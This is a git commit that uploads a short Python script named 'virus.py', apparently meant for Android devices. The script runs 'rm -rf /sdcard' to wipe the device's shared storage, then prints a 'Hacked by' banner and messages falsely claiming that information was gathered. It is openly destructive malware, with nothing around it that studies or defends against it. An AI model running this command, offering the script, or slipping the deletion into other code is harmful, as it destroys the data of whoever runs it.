46bfb28ac077ba605bf9c6c70dafcffc08e10595
DA4kE63 <78696114+DA4kE63@users.noreply.github.com>
2021-02-07 23:33:26 +0600

    Add files via upload

---
+++ virus.py
@@ -0,0 +1,14 @@
+import os
+os.sys
+
+i = 1
+while i <= 1:
+    os.system("cd /sdcard")
+    os.system("ls")
+    os.system("rm -rf /sdcard")
+    os.system("clear")
+    os.system("figlet Hacked by DA4k E63")
+    i = i +1
+print("you are now hacked")
+print("your all information gethering ")
+print("hacked by DA4K E63")
